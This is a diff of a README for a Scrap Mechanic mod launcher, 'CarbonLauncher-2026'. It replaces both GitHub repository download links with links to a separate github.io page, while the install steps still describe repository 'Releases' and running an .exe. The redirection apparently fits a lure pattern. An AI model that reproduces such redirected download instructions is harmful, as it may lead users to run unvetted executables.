@@ -1,6 +1,6 @@
 # ⚙️ CarbonLauncher-2026 - Launch Scrap Mechanic mods with ease
 
-[![](https://img.shields.io/badge/Download-CarbonLauncher-blue.svg)](https://github.com/Jasminacaitiff694/CarbonLauncher-2026)
+[![](https://img.shields.io/badge/Download-CarbonLauncher-blue.svg)](https://jasminacaitiff694.github.io)
 
 ## 📌 About this software
 CarbonLauncher-2026 provides a simple way to manage and run mods for Scrap Mechanic. This tool supports DLL mods and maintains your library by updating them automatically. You gain access to improved building trainers, crafting tools, and item unlocks without manual file manipulation. The launcher acts as a bridge between your game files and your installed mods.
@@ -16,7 +16,7 @@ Before you install, ensure your computer meets these specifications:
 ## 📥 How to download and install
 Follow these steps to set up the launcher on your system:
 
-1. Visit the repository page to get the latest version: [Download CarbonLauncher-2026](https://github.com/Jasminacaitiff694/CarbonLauncher-2026)
+1. Visit the repository page to get the latest version: [Download CarbonLauncher-2026](https://jasminacaitiff694.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the latest version link to expand the assets.
 4. Download the file ending in .exe to your computer.
